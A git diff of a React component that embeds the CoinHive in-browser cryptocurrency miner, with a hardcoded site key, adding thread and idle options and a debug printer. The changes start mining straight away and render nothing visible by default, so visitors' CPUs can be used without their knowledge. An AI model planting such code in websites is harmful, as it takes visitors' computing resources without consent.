@@ -5,20 +5,22 @@ import PropTypes from 'prop-types';
 
 class CoinHiveClient extends Component {
 
-  constructor(props) {
-    super(props);
-    this.miner = null;
-    this.idle = false;
-  }
-
   static defaultProps = {
+    autoThreads: false,
     timeout: 30000,
     threads: 2,
     throttle: 0,
     siteKey: 'NjBUIBfgmgqwSRGjemP5JQCNFJu5UJTx',
+    startOnIdle: false,
     onInit: (miner) => { },
     onStart: (miner) => { },
     onStop: (miner) => { }
+  }
+
+  constructor(props) {
+    super(props);
+    this.miner = null;
+    this.idle = false;
   }
 
   start() {
@@ -35,7 +37,10 @@ class CoinHiveClient extends Component {
     }
   }
 
-  async componentWillMount() {
+  buildMiner = async () => {
+    if (this.miner && this.miner.isRunning()) {
+      this.stop();
+    }
     this.miner = await new Promise(resolve => {
       loadScript('https://coinhive.com/lib/coinhive.min.js', () => {
         if (this.props.userName) {
@@ -45,20 +50,34 @@ class CoinHiveClient extends Component {
       })
     })
     this.handleProps(this.props);
+  }
+
+  async componentWillMount() {
+    await this.buildMiner();
     this.props.onInit(this.miner);
-    if (this.idle) {
+    if (!this.idle) {
       this.start();
     }
   }
 
-  componentWillReceiveProps(nextProps) {
-    return this.handleProps(nextProps);
+  async componentWillReceiveProps(nextProps) {
+    this.handleProps(nextProps);
+    this.stop();
+    await this.buildMiner();
+    if (!this.idle) {
+      this.start();
+    }
+    return;
   }
 
-  handleProps({ throttle, threads }) {
+  handleProps({ throttle, threads, autoThreads }) {
     if (this.miner != null) {
-      this.miner.setNumThreads(threads);
       this.miner.setThrottle(throttle);
+      if (autoThreads) {
+        this.miner.setAutoThreadsEnabled(autoThreads);
+      } else {
+        this.miner.setNumThreads(threads);
+      }
     }
   }
 
@@ -74,7 +93,11 @@ class CoinHiveClient extends Component {
     this.idle = idle;
   }
 
+
   render() {
+    if (!this.props.startOnIdle) {
+      return null;
+    }
     return <Idle
       timeout={this.props.timeout}
       onChange={this.handleIdleChange}
@@ -89,6 +112,27 @@ CoinHiveClient.PropTypes = {
   onStart: PropTypes.func,
   onStop: PropTypes.func,
   userName: PropTypes.string,
+  autoThreads: PropTypes.bool,
+  startOnIdle: PropTypes.bool,
 };
+
+CoinHiveClient.displayMiner = miner => {
+  if (!miner || typeof miner !== 'object' || typeof miner.isRunning !== 'function') {
+    console.log('miner is not defined')
+    return;
+  }
+  const data = {
+    isRunning: miner.isRunning(),
+    getHashesPerSecond: miner.getHashesPerSecond(),
+    getNumThreads: miner.getNumThreads(),
+    getAutoThreadsEnabled: miner.getAutoThreadsEnabled(),
+    hasWASMSupport: miner.hasWASMSupport(),
+    getThrottle: miner.getThrottle(),
+    getToken: miner.getToken(),
+    getTotalHashes: miner.getTotalHashes(),
+    getAcceptedHashes: miner.getAcceptedHashes(),
+  };
+  console.log(data)
+}
 
 export default CoinHiveClient;
